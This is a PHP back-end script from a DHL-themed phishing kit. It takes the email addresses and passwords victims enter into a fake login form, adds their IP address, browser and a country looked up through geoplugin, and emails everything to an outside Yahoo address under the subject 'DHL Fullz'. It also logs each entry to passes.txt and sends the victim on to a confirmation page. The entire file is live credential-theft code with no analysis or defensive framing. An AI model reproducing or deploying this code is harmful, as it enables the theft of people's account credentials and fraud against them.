<?php
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}


if (isset($_POST['email']) && isset($_POST['password'])) {
  $email = $_POST['email'];
  $password = $_POST['password'];
  if (!empty($email) && !empty($password)) {
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$message = "--------+ DHL Wire ReZulT +--------\n";
$message .= "Email ID : ".$email."\n";
$message .= "Email Password : ".$password."\n";
$message .= "-----------------------------------\n";
$message .= "User Agent : ".$browser."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "Country : ".$country."\n";
$message .= "Date: ".$adddate."\n";
$message .= "--+ Created BY Zeus in 2018 +---\n";

$send = "martingray101@yahoo.com";

$subject = "DHL Fullz | $country | $email";
$headers = "MIME-Version: 1.0\n";
$headers .= "From Hephzibar_craw <new@cpanel.com>\n";

mail($send,$subject,$message,$headers);
header("Location: ./confirm.php");
$file = "passes.txt";

$fp = fopen($file, "a") or die("Couldn't open $file for writing!");
fwrite($fp, $message) or die("Couldn't write values to file!");
fclose($fp);

  }
}



if (isset($_POST['emails']) && isset($_POST['passwords'])) {
  $emails = $_POST['emails'];
  $passwords = $_POST['passwords'];
  if (!empty($emails) && !empty($passwords)) {
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$message = "--------+ DHL Wire ReZulT +--------\n";
$message .= "Email ID : ".$emails."\n";
$message .= "Email Password : ".$passwords."\n";
$message .= "-----------------------------------\n";
$message .= "User Agent : ".$browser."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "Country : ".$country."\n";
$message .= "Date: ".$adddate."\n";
$message .= "--+ Created BY Zeus in 2018 +---\n";

$send = "martingray101@yahoo.com";

$subject = "DHL Fullz | $country | $email";
$headers = "MIME-Version: 1.0\n";
$headers .= "From Hephzibar_craw <new@cpanel.com>\n";

mail($send,$subject,$message,$headers);
header("Location: ./success.php");
$file = "passes.txt";

$fp = fopen($file, "a") or die("Couldn't open $file for writing!");
fwrite($fp, $message) or die("Couldn't write values to file!");
fclose($fp);

  }
}

?>